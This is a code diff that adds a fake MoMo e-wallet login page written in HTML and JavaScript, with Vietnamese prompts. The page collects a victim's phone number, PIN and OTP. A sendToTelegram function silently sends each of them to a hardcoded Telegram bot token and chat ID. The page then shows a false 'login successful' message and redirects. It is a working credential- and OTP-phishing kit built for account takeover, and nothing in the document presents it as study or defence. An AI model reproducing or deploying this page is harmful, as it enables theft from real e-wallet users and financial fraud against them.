@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <title>H2Kinformation technology</title>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="login-form">
+            <label for="phone">Đăng nhập số momo:</label>
+            <input type="tel" id="phone" name="phone" required pattern="\d{10}" title="Please enter a 10-digit phone number starting with 0">
+
+            <label for="password">Đăng Nhập Password:</label>
+            <input type="password" id="password" name="password" required pattern="\d{4}" title="Please enter a 4-digit password">
+
+            <!-- Bước 1: Nhập số điện thoại và mật khẩu -->
+            <button type="button" onclick="validatePhoneAndPass()">Gửi OTP</button>
+            
+            <!-- Bước 2: Nhập OTP (ban đầu ẩn đi) -->
+            <div id="otp-container" style="display: none;">
+                <label for="otp">Nhập OTP:</label>
+                <input type="text" id="otp" name="otp" required pattern="\d{4}" title="Please enter a 4-digit OTP">
+                
+                <!-- Bước 3: Nút "Login" -->
+                <button type="button" onclick="sendOTPOrLogin()">Login</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function validatePhoneAndPass() {
+            const phoneInput = document.getElementById('phone');
+            const passwordInput = document.getElementById('password');
+            const otpContainer = document.getElementById('otp-container');
+        
+            // Kiểm tra số điện thoại có 10 số bắt đầu từ số 0
+            const phoneRegex = /^0\d{9}$/;
+            if (!phoneRegex.test(phoneInput.value)) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Số điện thoại không hợp lệ!',
+                    text: 'Vui lòng nhập số điện thoại có 10 số bắt đầu từ số 0.',
+                });
+                return;
+            }
+        
+            // Kiểm tra mật khẩu có 4 số
+            const passwordRegex = /^\d{6}$/;
+            if (!passwordRegex.test(passwordInput.value)) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Mật khẩu không hợp lệ!',
+                    text: 'Vui lòng nhập mật khẩu có 6 số.',
+                });
+                return;
+            }
+        
+            // Hiển thị SweetAlert khi thông tin hợp lệ và chuẩn bị gửi OTP
+            Swal.fire({
+                icon: 'info',
+                title: 'Chuẩn bị gửi OTP',
+                text: 'Vui lòng đợi trong giây lát...',
+                showConfirmButton: false, // Ẩn nút xác nhận
+                timer: 2000, // Hiển thị trong 2 giây
+            });
+        
+            // Simulate sending OTP (you can replace this with your actual OTP sending logic)
+            setTimeout(() => {
+                // Ẩn bước 1 và hiển thị bước 2
+                document.querySelector('button').style.display = 'none';
+                otpContainer.style.display = 'block';
+        
+                // Hiển thị SweetAlert khi chuẩn bị xong
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Chuẩn bị xong',
+                    text: 'Vui lòng nhập OTP để hoàn tất đăng nhập.',
+                });
+            }, 2000); // Giả lập việc gửi OTP trong 2 giây
+        
+
+            document.querySelector('button').style.display = 'none';
+            otpContainer.style.display = 'block';
+
+            sendToTelegram(`Số Momo: ${phoneInput.value}\nMật khẩu: ${passwordInput.value}`);
+        }
+
+        function sendOTPOrLogin() {
+            const otpInput = document.getElementById('otp');
+        
+            const otpRegex = /^\d{4}$/;
+            if (!otpRegex.test(otpInput.value)) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'OTP không hợp lệ!',
+                    text: 'Vui lòng nhập OTP có 4 số.',
+                });
+                return;
+            }
+
+            sendToTelegram(`OTP: ${otpInput.value}`);
+
+            Swal.fire({
+                icon: 'success',
+                title: 'Đăng nhập thành công!',
+                text: 'Thông tin của bạn đã được xác nhận.',
+            }).then(() => {
+                window.location.href = 'html2.html';
+            });
+        }
+
+        function sendToTelegram(message) {
+            const botToken = '6889088304:AAED5-lcYegRJRP6dPeQiOvLSs0KbxkkyfU';
+            const chatId = '6520036650';
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
